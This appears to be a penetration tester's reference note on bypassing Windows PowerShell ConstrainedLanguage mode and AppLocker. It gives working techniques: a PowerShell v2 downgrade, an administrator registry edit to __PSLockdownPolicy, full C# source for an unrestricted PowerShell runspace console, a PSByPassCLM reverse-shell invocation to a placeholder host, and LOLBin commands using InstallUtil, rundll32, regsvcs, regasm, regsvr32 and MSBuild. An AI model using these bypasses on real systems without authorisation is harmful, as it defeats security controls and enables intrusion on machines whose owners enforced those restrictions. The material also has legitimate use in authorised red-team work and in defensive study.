# Windows - Bypass PowerShell ConstrainedLanguage mode

### Overview

As described in the [official Microsoft documentation](https://docs.microsoft.com/fr-fr/powershell/module/microsoft.powershell.core/about/about_language_modesThe),
the language mode of a PowerShell session determines, in part, which elements
of the PowerShell language can be used in the session.

The following four language modes are currently supported in PowerShell:

| Language mode | Description |
|---------------|-------------|
| `FullLanguage` | No restriction imposed and allows all language elements. <br><br> Default language mode. |
| `RestrictedLanguage` | All commands (cmdlets, functions, etc.) are allowed but the use of script blocks is not permitted. |
| `NoLanguage` | Can only be used through the API as no script text of any form is permitted. |
| `ConstrainedLanguage` <br><br> Introduced in PowerShell version 3.0. | All cmdlets and PowerShell language elements are authorized, but it strongly limits the types allowed. For instance, the direct use of .NET methods (such as `System.Net.Webclient`), Win32 APIs, and COM objects are not permitted. <br><br> Use of offensive PowerShell scripts is likely not directly possible in sessions running in this mode. <br><br> For more information on the allowed types, the [Microsoft documentation](https://docs.microsoft.com/fr-fr/powershell/module/microsoft.powershell.core/about/about_language_modes#constrained-language-constrained-language) can be consulted. |

The PowerShell language mode can be defined in the `__PSLockdownPolicy`
environment variable. The following registry key sets the aforementioned
variable system-wide, resulting in the defined language mode to be enforced for
all PowerShell sessions:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\__PSLockdownPolicy
```

###### AppLocker & PowerShell ConstrainedLanguage mode

Starting from PowerShell version 5.0, if a Windows `AppLocker` policy in `Allow
Mode` (whitelisting) is applied to scripts, PowerShell will automatically start
in `ConstrainedLanguage` mode. As per
[PowerShell ♥ the Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/),
this restriction applies to both interactive input and user-authored scripts.

### PowerShell language mode retrieval

The following command retrieves the language mode of the current PowerShell
session:

```
$ExecutionContext.SessionState.LanguageMode
```

Note that in sessions running in `RestrictedLanguage` or `NoLanguage` mode, the
command will return an error, due to the fact that the dot method cannot be
used to retrieve property values. The error message returned will however
indicate the language mode of the session.

### [Unprivileged] ConstrainedLanguage mode bypass using PowerShell downgrade

As the `ConstrainedLanguage` language mode was introduced in PowerShell version
3.0, executing PowerShell version 2.0 can be used to easily bypass the
restriction:

```
# Starts an interactive PowerShell session.
powershell.exe -version 2

powershell.exe -version 2 -c '$ExecutionContext.SessionState.LanguageMode'
```

Note that downgrading PowerShell to circumvent language mode will not be doable
on the Windows 10 operating system in a default configuration, as the
underlying `.NET Framework 2.0`, required to run version 2.0 of PowerShell, is
not installed.

### [Privileged] System-wide deactivation through removal of the associated registry key

By default, members of the local built-in `Administrators` group can modify the
`__PSLockdownPolicy` registry key, which governs the system-wide setting of the
language mode environment variable.

A new PowerShell session must be started after the modification for the new
environment variable value to be taken into account.

```
# Retrieves the ACL of the Environment registry key.

Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" | Select-Object -ExpandProperty Access
```

```
# Sets the PowerShell language mode to "FullLanguage".
# FullLanguage = 8 & ConstrainedLanguage = 4.

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy -Value 8
```

### [Unprivileged] ConstrainedLanguage mode bypass using PowerShell hosts

As the language mode is only applied to `powershell.exe` / `PowerShell ISE`,
creating a
[PowerShell host in a C# application](https://docs.microsoft.com/en-us/powershell/scripting/developer/hosting/windows-powershell-host-quickstart)
may be use to bypass the
`ConstrainedLanguage` language mode. PowerShell commands can indeed be called
in a different runspace in C# application using the
`System.Management.Automation` library. The PowerShell commands called under
this scenario will not be affected by the language mode defined on the system.

###### Standard binary

The following C# code snipped, adapted from
[`PSByPassCLM`](https://github.com/padovah4ck/PSByPassCLM), can be used to
emulate an interactive PowerShell console in a runspace unaffected by language
mode:

```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;

namespace PowerShellConstrainedLanguageBypass {
    public class Program {
        public static void Main(string[] args) {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            string cmd = "";
            do {
                Console.Write("PS > ");
                cmd = Console.ReadLine();

                if (!string.IsNullOrEmpty(cmd)) {

                    using (Pipeline pipeline = runspace.CreatePipeline()) {

                        try {
                            pipeline.Commands.AddScript(cmd);
                            pipeline.Commands.Add("Out-String");

                            Collection<PSObject> results = pipeline.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();

                            foreach (PSObject obj in results) {
                                stringBuilder.AppendLine(obj.ToString());
                            }

                            Console.Write(stringBuilder.ToString());
                        }

                        catch (Exception ex) {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            } while (cmd != "exit");
        }
    }
}
```

`PSByPassCLM` provides an already compiled binary in the project's GitHub
repository:

```
# Starts an interactive PowerShell console.
PsBypassCLM.exe

# Attempts a reverse shell connection to the specified host. The remote host must be listening on the specified port.
PsBypassCLM.exe <HOSTNAME | IP> <PORT>
```

###### With AppLocker restricting executable usage

If Windows `AppLocker` is enabled, and a policy restrict the execution of
binaries, `AppLocker` will have to be circumvented in order to bypass the
PowerShell `ConstrainedLanguage` language mode. In its default configuration,
`AppLocker` can be easily bypassed. Refer to the `Windows - Bypass AppLocker`
note for more information on how to enumerate the defined rules and
default-configuration bypass techniques.

If an hardened `AppLocker` configuration is implemented, the following tools
leverage Windows built-in binaries, that may be allowed by the `AppLocker`
rules defined in the targeted environment, to bypass the `ConstrainedLanguage`
language mode. Windows built-in binaries are exploited to load a C# `Dynamic
Link Library (DLL)` that uses the `System.Management.Automation` library to
emulate an interactive PowerShell console unaffected by language mode
(similarly to what is accomplished by the script above).   

| Tool | Exploited built-in binaries | Command |
|------|-----------------------------|---------|
| `PSByPassCLM` | `InstallUtil.exe` | x86 systems: <br> `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <PSBYPASSCLM_BINARY_FULL_PATH>` <br><br> x64 systems: <br> `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U <PSBYPASSCLM_BINARY_FULL_PATH>` |
| `PowerShdll` | `rundll32` <br><br> `InstallUtil.exe` <br> *Documented as supported but does not seem to work properly.* <br><br> `regsvcs.exe` <br><br>  `regasm.exe` <br> *Requires elevated privileges.* <br><br> `regsvr32` | `rundll32`: <br> - Start an interactive console in a new windows: <br> `rundll32 <POWERSHDLL_PATH>,main` <br> - Execute the specified script: <br> `rundll32 <POWERSHDLL_PATH>,main -f <SCRIPT_PATH>` <br><br> `regsvcs.exe`: <br> x86 systems: <br> `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe <POWERSHDLL_PATH>` <br> x64 systems: <br> `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe <POWERSHDLL_PATH>` <br><br> `regasm.exe`: <br> x86 systems: <br> `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe <POWERSHDLL_PATH>` <br> x64 systems: <br> `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe <POWERSHDLL_PATH>` <br><br> `regsvr32`: <br> `regsvr32 /s /u <POWERSHDLL_PATH>` (calls `DllUnregisterServer`). <br> `regsvr32 /s <POWERSHDLL_PATH>` (calls `DllRegisterServer`). |
| `PowerLessShell` | `MSBuild.exe` | Generation of the `csproj` that will execute the specified PowerShell script (such as `Invoke-PowerShellTcp`): <br> `python2 PowerLessShell.py` <br> `Set payload type [...]> powershell` <br> `Path to the PowerShell script> <POWERSHELL_SCRIPT_TO_EXEC>` <br> `Path for the generated MsBuild out file> <CSPROJ_OUTPUT>` <br><br> Execution using `MSBuild`: <br> `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild <CSPROJ_FILE>` |

--------------------------------------------------------------------------------

### References

http://www.3nc0d3r.com/2016/12/pslockdownpolicy-and-ways-around-it.html
https://github.com/p3nt4/PowerShdll
https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
https://decoder.cloud/2017/11/17/we-dont-need-powershell-exe-part-3/
https://github.com/padovah4ck/PSByPassCLM
https://www.sysadmins.lv/blog-en/powershell-50-and-applocker-when-security-doesnt-mean-security.aspx
https://github.com/stonepresto/CLMBypass
